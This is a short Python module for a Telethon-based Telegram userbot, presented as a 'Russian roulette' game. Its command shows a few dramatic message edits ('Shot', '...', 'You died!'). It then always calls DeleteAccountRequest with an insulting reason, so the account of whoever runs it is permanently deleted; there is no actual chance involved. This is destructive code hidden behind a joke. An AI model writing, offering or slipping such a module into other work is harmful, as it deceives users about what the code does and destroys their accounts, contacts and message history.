from .. import loader
from telethon.tl.functions.account import DeleteAccountRequest
from asyncio import sleep

class RouleMod(loader.Module):
	strings = {"name": "RusRoul"}
	
	async def client_ready(self, client, db):
		self.client = client
	async def ruscmd(self, message):
		await message.edit("Выстрел")
		await sleep(1)
		await message.edit("...")
		await sleep(3)
		await message.edit("Ты умер!")
		await self.client(DeleteAccountRequest(reason = "по причине, уебан"))
		